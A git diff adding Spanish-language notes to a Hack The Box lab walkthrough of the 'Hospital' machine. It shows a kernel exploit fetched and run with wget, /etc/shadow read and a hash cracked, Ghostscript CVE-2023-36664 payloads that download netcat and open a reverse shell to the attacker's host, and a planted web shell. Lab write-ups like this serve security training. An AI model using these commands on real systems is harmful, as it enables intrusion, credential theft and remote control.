@@ -253,4 +253,506 @@ a nuestro equipo de la siguiente forma:
 y nos ponemos en escucha:
 nc -lnvp <nuestro_puerto>
 
+copiamos en la carpeta exploit la siguiente vulneravilidad
 
+❯ git clone https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629.git
+
+ingresamos a la carpeta 
+
+❯ cd CVE-2023-2640-CVE-2023-32629
+
+creamos un servidor de python
+
+python3 -m http.server
+
+en la maquina en la carpeta de tmp nos desacrgamos el exploit con wget 
+
+wget 10.10.14.110:8000/exploit.sh
+
+le damos permisoa de ejecucion con 
+
+chmod +x <exploit.sh>
+
+y lo ejecutamos 
+
+./exploit.sh
+
+Obtendremos el acceso a root del web server
+
+hacemos un cat /etc/passwd para ver a los usuarios
+podemos ver a l usuario drwilliams
+
+procedemos a ver el el /etc/shadow
+
+donde podemos ver el hash de drwilliams y root
+
+lo guardamos en content
+
+procedemos a crackear el has con hashcat
+
+❯ hashcat hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting in autodetect mode
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-haswell-AMD Ryzen 7 5800H with Radeon Graphics, 2765/5594 MB (1024 MB allocatable), 16MCU
+
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+1800 | sha512crypt $6$, SHA512 (Unix) | Operating System
+
+NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
+Do NOT report auto-detect issues unless you are certain of the hash type.
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashfile 'hash' on line 2 (root:$...eobZ1dzDs..dD:19612:0:99999:7:::): Token length exception
+
+* Token length exception: 1/2 hashes
+  This error happens if the wrong hash type is specified, if the hashes are
+  malformed, or if input is otherwise not as expected (for example, if the
+  --username option is used but no username is present)
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Uses-64-Bit
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+* Runtime...: 1 sec
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz...W192y/
+Time.Started.....: Wed Dec 20 19:28:16 2023 (24 secs)
+Time.Estimated...: Wed Dec 20 20:27:54 2023 (59 mins, 14 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     4009 H/s (1.53ms) @ Accel:512 Loops:64 Thr:1 Vec:4
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 96768/14344384 (0.67%)
+Rejected.........: 0/96768 (0.00%)
+Restore.Point....: 96768/14344384 (0.67%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2816-2880
+Candidate.Engine.: Device Generator
+Candidates.#1....: jessica101 -> ericalynn
+
+$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz...W192y/
+Time.Started.....: Wed Dec 20 19:28:16 2023 (54 secs)
+Time.Estimated...: Wed Dec 20 19:29:10 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     3951 H/s (1.42ms) @ Accel:512 Loops:64 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 214528/14344384 (1.50%)
+Rejected.........: 0/214528 (0.00%)
+Restore.Point....: 214016/14344384 (1.49%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: rayburn -> pkpkpk
+
+Started: Wed Dec 20 19:27:36 2023
+Stopped: Wed Dec 20 19:29:12 2023
+
+obteniendo el password
+
+de esta forma podemos ingresas a https://hospital.htb
+
+ingresamos el usuario y contraseNa que tenemos
+
+ingresamos al buzon de entrada y vemos algo referente Ghostscript
+
+damos una busqueda en google refrnte al tema y vemos una vulnerabilidad 
+https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git
+
+❯ python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.110:8000/nc64.exe -o nc.exe" --filename file.eps
+
+❯ python3 -m http.server
+
+❯ python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.110 1111 -e cmd.exe" --filename file.eps
+
+❯ nc -nlvp 1111
+
+
+❯ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.107] from (UNKNOWN) [10.10.11.241] 6114
+Microsoft Windows [Version 10.0.17763.4974]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\drbrown.HOSPITAL\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\drbrown.HOSPITAL\Documents
+
+12/25/2023  11:34 PM    <DIR>          .
+12/25/2023  11:34 PM    <DIR>          ..
+10/23/2023  02:33 PM               373 copy.bat
+10/23/2023  02:33 PM               373 ghostscript.bat
+12/25/2023  11:31 PM            45,272 nc.exe
+               3 File(s)         46,018 bytes
+               2 Dir(s)   4,100,231,168 bytes free
+
+C:\Users\drbrown.HOSPITAL\Documents>cd ../
+cd ../
+
+C:\Users\drbrown.HOSPITAL>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\drbrown.HOSPITAL
+
+11/13/2023  09:40 PM    <DIR>          .
+11/13/2023  09:40 PM    <DIR>          ..
+11/13/2023  09:40 PM    <DIR>          .cache
+10/26/2023  11:24 PM    <DIR>          3D Objects
+10/26/2023  11:24 PM    <DIR>          Contacts
+10/26/2023  11:24 PM    <DIR>          Desktop
+12/25/2023  11:34 PM    <DIR>          Documents
+12/26/2023  05:41 PM    <DIR>          Downloads
+10/26/2023  11:24 PM    <DIR>          Favorites
+10/26/2023  11:24 PM    <DIR>          Links
+10/26/2023  11:24 PM    <DIR>          Music
+10/26/2023  11:24 PM    <DIR>          Pictures
+10/26/2023  11:24 PM    <DIR>          Saved Games
+10/26/2023  11:24 PM    <DIR>          Searches
+10/26/2023  11:24 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              15 Dir(s)   4,100,231,168 bytes free
+
+C:\Users\drbrown.HOSPITAL>cd Desktop
+cd Desktop
+
+C:\Users\drbrown.HOSPITAL\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\drbrown.HOSPITAL\Desktop
+
+10/26/2023  11:24 PM    <DIR>          .
+10/26/2023  11:24 PM    <DIR>          ..
+12/25/2023  09:15 PM                34 user.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4,100,231,168 bytes free
+
+C:\Users\drbrown.HOSPITAL\Desktop>type user.txt
+type user.txt
+11835c5c47fbe9407b35d5c4a8c540dc
+
+C:\Users\drbrown.HOSPITAL\Desktop>cd ../
+cd ../
+
+C:\Users\drbrown.HOSPITAL>cd Documents
+cd Documents
+
+C:\Users\drbrown.HOSPITAL\Documents>ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\drbrown.HOSPITAL\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\drbrown.HOSPITAL\Documents
+
+12/25/2023  11:34 PM    <DIR>          .
+12/25/2023  11:34 PM    <DIR>          ..
+10/23/2023  02:33 PM               373 copy.bat
+10/23/2023  02:33 PM               373 ghostscript.bat
+12/25/2023  11:31 PM            45,272 nc.exe
+               3 File(s)         46,018 bytes
+               2 Dir(s)   4,100,231,168 bytes free
+
+C:\Users\drbrown.HOSPITAL\Documents>type ghostscript.bat
+type ghostscript.bat
+@echo off
+set filename=%~1
+powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
+C:\Users\drbrown.HOSPITAL\Documents>
+
+C:\Users\drbrown.HOSPITAL>cd Desktop
+cd Desktop
+
+C:\Users\drbrown.HOSPITAL\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\drbrown.HOSPITAL\Desktop
+
+10/26/2023  11:24 PM    <DIR>          .
+10/26/2023  11:24 PM    <DIR>          ..
+12/25/2023  09:15 PM                34 user.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4,100,231,168 bytes free
+
+C:\Users\drbrown.HOSPITAL\Desktop>type user.txt
+type user.txt
+11835c5c47fbe9407b35d5c4a8c540dc
+
+❯ git clone https://github.com/flozz/p0wny-shell.git
+Cloning into 'p0wny-shell'...
+remote: Enumerating objects: 212, done.
+remote: Counting objects: 100% (134/134), done.
+remote: Compressing objects: 100% (51/51), done.
+remote: Total 212 (delta 92), reused 110 (delta 82), pack-reused 78
+Receiving objects: 100% (212/212), 115.78 KiB | 785.00 KiB/s, done.
+Resolving deltas: 100% (122/122), done.
+❯ cd p0wny-shell
+
+❯ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.241 - - [26/Dec/2023 13:50:58] "GET /shell.php HTTP/1.1" 200 -
+10.10.11.241 - - [26/Dec/2023 13:52:08] "GET /shell.php HTTP/1.1" 200 -
+
+C:\xampp\htdocs>curl 10.10.14.107:8000/shell.php -o shell.php
+curl 10.10.14.107:8000/shell.php -o shell.php
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 20321  100 20321    0     0  69177      0 --:--:-- --:--:-- --:--:-- 69354
+
+C:\xampp\htdocs>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\xampp\htdocs
+
+12/26/2023  06:52 PM    <DIR>          .
+12/26/2023  06:52 PM    <DIR>          ..
+10/16/2023  11:23 AM             2,553 .htaccess
+10/22/2023  09:19 PM    <DIR>          bin
+10/16/2023  11:23 AM           211,743 CHANGELOG.md
+10/16/2023  11:23 AM               994 composer.json
+10/16/2023  11:23 AM             1,086 composer.json-dist
+10/16/2023  11:23 AM            56,279 composer.lock
+10/22/2023  10:47 PM    <DIR>          config
+10/22/2023  09:33 PM    <DIR>          default
+12/26/2023  06:22 AM            20,321 fady.php
+10/16/2023  11:23 AM            11,199 index.php
+10/16/2023  11:23 AM            12,661 INSTALL
+10/22/2023  09:19 PM    <DIR>          installer
+10/16/2023  11:23 AM            35,147 LICENSE
+10/22/2023  09:32 PM    <DIR>          logs
+10/22/2023  09:19 PM    <DIR>          plugins
+10/22/2023  09:20 PM    <DIR>          program
+10/16/2023  11:23 AM             3,853 README.md
+12/26/2023  06:33 AM             1,351 rev.ps1
+10/16/2023  11:23 AM               967 SECURITY.md
+12/26/2023  06:52 PM            20,321 shell.php
+10/22/2023  09:20 PM    <DIR>          skins
+12/26/2023  12:02 AM            20,321 spicy.phar
+12/26/2023  12:04 AM            20,321 spicy.php
+10/22/2023  09:19 PM    <DIR>          SQL
+12/26/2023  05:52 PM    <DIR>          temp
+10/16/2023  11:23 AM             4,657 UPGRADING
+10/22/2023  09:20 PM    <DIR>          vendor
+              16 File(s)        423,774 bytes
+              13 Dir(s)   4,096,286,720 bytes free
+
+ingresamos a el explorador https://hospital.htb/shell.php
+
+
+DC$@DC:C:\xampp\htdocs# id
+'id' is not recognized as an internal or external command,
+operable program or batch file.
+
+DC$@DC:C:\xampp\htdocs# dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\xampp\htdocs
+
+12/26/2023  06:52 PM    <DIR>          .
+12/26/2023  06:52 PM    <DIR>          ..
+10/16/2023  11:23 AM             2,553 .htaccess
+10/22/2023  09:19 PM    <DIR>          bin
+10/16/2023  11:23 AM           211,743 CHANGELOG.md
+10/16/2023  11:23 AM               994 composer.json
+10/16/2023  11:23 AM             1,086 composer.json-dist
+10/16/2023  11:23 AM            56,279 composer.lock
+10/22/2023  10:47 PM    <DIR>          config
+10/22/2023  09:33 PM    <DIR>          default
+12/26/2023  06:22 AM            20,321 fady.php
+10/16/2023  11:23 AM            11,199 index.php
+10/16/2023  11:23 AM            12,661 INSTALL
+10/22/2023  09:19 PM    <DIR>          installer
+10/16/2023  11:23 AM            35,147 LICENSE
+10/22/2023  09:32 PM    <DIR>          logs
+10/22/2023  09:19 PM    <DIR>          plugins
+10/22/2023  09:20 PM    <DIR>          program
+10/16/2023  11:23 AM             3,853 README.md
+12/26/2023  06:33 AM             1,351 rev.ps1
+10/16/2023  11:23 AM               967 SECURITY.md
+12/26/2023  06:52 PM            20,321 shell.php
+10/22/2023  09:20 PM    <DIR>          skins
+12/26/2023  12:02 AM            20,321 spicy.phar
+12/26/2023  12:04 AM            20,321 spicy.php
+10/22/2023  09:19 PM    <DIR>          SQL
+12/26/2023  05:52 PM    <DIR>          temp
+10/16/2023  11:23 AM             4,657 UPGRADING
+10/22/2023  09:20 PM    <DIR>          vendor
+              16 File(s)        423,774 bytes
+              13 Dir(s)   4,096,286,720 bytes free
+
+DC$@DC:C:\xampp\htdocs# cd ../
+
+
+DC$@DC:C:\xampp# cd ../
+
+
+DC$@DC:C:\# dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\
+
+10/21/2023  03:34 PM                32 BitlockerActiveMonitoringLogs
+10/21/2023  04:12 PM    <DIR>          ExchangeSetupLogs
+10/22/2023  08:48 PM    <DIR>          inetpub
+11/05/2022  11:03 AM    <DIR>          PerfLogs
+11/13/2023  06:05 PM    <DIR>          Program Files
+10/22/2023  09:01 PM    <DIR>          Program Files (x86)
+09/06/2023  02:50 AM    <DIR>          root
+09/06/2023  06:57 AM    <DIR>          Users
+12/26/2023  01:02 PM    <DIR>          Windows
+12/26/2023  06:54 AM    <DIR>          xampp
+               1 File(s)             32 bytes
+               9 Dir(s)   4,096,286,720 bytes free
+
+DC$@DC:C:\# cd Users
+
+
+DC$@DC:C:\Users# dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users
+
+09/06/2023  06:57 AM    <DIR>          .
+09/06/2023  06:57 AM    <DIR>          ..
+09/06/2023  01:08 AM    <DIR>          .NET v4.5
+09/06/2023  01:08 AM    <DIR>          .NET v4.5 Classic
+11/13/2023  09:05 PM    <DIR>          Administrator
+09/06/2023  12:49 AM    <DIR>          drbrown
+11/13/2023  09:40 PM    <DIR>          drbrown.HOSPITAL
+09/06/2023  12:49 AM    <DIR>          drwilliams
+09/06/2023  06:55 AM    <DIR>          drwilliams.HOSPITAL
+09/05/2023  08:24 AM    <DIR>          Public
+               0 File(s)              0 bytes
+              10 Dir(s)   4,096,286,720 bytes free
+
+DC$@DC:C:\Users# cd Administrator
+
+
+DC$@DC:C:\Users\Administrator# dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\Administrator
+
+11/13/2023  09:05 PM    <DIR>          .
+11/13/2023  09:05 PM    <DIR>          ..
+11/13/2023  09:05 PM    <DIR>          .cache
+09/07/2023  06:55 AM    <DIR>          .dotnet
+09/07/2023  01:39 PM    <DIR>          .ssh
+10/26/2023  11:29 PM    <DIR>          3D Objects
+10/26/2023  11:29 PM    <DIR>          Contacts
+10/26/2023  11:29 PM    <DIR>          Desktop
+10/26/2023  11:29 PM    <DIR>          Documents
+11/13/2023  06:04 PM    <DIR>          Downloads
+09/06/2023  01:46 AM    <DIR>          ExchangeLanguagePack
+10/26/2023  11:29 PM    <DIR>          Favorites
+10/26/2023  11:29 PM    <DIR>          Links
+10/26/2023  11:29 PM    <DIR>          Music
+10/26/2023  11:29 PM    <DIR>          Pictures
+10/26/2023  11:29 PM    <DIR>          Saved Games
+10/26/2023  11:29 PM    <DIR>          Searches
+10/26/2023  11:29 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              18 Dir(s)   4,096,286,720 bytes free
+
+DC$@DC:C:\Users\Administrator# cd Documents
+
+
+DC$@DC:C:\Users\Administrator\Documents# dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\Administrator\Documents
+
+10/26/2023  11:29 PM    <DIR>          .
+10/26/2023  11:29 PM    <DIR>          ..
+10/26/2023  04:39 PM    <DIR>          installers
+11/16/2023  11:11 AM    <DIR>          scripts
+09/14/2023  10:08 AM    <DIR>          vms
+09/07/2023  06:44 AM    <DIR>          WindowsPowerShell
+               0 File(s)              0 bytes
+               6 Dir(s)   4,096,286,720 bytes free
+
+DC$@DC:C:\Users\Administrator\Documents# cd ../
+
+
+DC$@DC:C:\Users\Administrator# cd Desktop
+
+
+DC$@DC:C:\Users\Administrator\Desktop# dir
+ Volume in drive C has no label.
+ Volume Serial Number is 7357-966F
+
+ Directory of C:\Users\Administrator\Desktop
+
+10/26/2023  11:29 PM    <DIR>          .
+10/26/2023  11:29 PM    <DIR>          ..
+12/25/2023  09:15 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4,096,286,720 bytes free
+
+DC$@DC:C:\Users\Administrator\Desktop# type root,txt
+The system cannot find the file specified.
+Error occurred while processing: root.
+The system cannot find the file specified.
+Error occurred while processing: txt.
+
+DC$@DC:C:\Users\Administrator\Desktop# type root.txt
+48cdb419bd8e60c04a703ec126eca5ae
+
+
+https://www.hackthebox.com/achievement/machine/926397/576
